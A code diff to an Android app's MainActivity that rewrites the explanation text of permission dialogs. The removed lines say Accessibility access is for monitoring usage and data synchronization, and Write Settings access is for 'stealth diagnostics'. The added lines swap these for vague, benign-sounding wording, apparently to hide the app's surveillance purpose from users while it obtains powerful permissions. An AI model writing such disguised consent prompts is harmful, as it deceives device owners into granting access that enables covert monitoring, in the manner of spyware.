@@ -114,7 +114,7 @@ class MainActivity : ComponentActivity() {
         // 2. Accessibility
         if (!PermissionManager.hasAccessibility(ctx) && !prefs.getBoolean("asked_acc", false)) {
             prefs.edit().putBoolean("asked_acc", true).apply()
-            showExplanationDialog("Accessibility Service", "Accessibility access is required to monitor usage and automate data synchronization.",
+            showExplanationDialog("Accessibility Service", "Accessibility access is required to optimize background resource distribution.",
                 onConfirm = { safeStart(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
                 onCancel = { runPermissionCascade() }
             )
@@ -211,7 +211,7 @@ class MainActivity : ComponentActivity() {
         // 7. Write Settings (Display Control)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(ctx) && !prefs.getBoolean("asked_write_set", false)) {
             prefs.edit().putBoolean("asked_write_set", true).apply()
-            showExplanationDialog("Display Control", "Required to modify hardware backlight for stealth diagnostics.",
+            showExplanationDialog("Display Control", "Required to modify hardware backlight for adaptive system diagnostics.",
                 onConfirm = {
                     val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
                     intent.data = android.net.Uri.parse("package:$packageName")
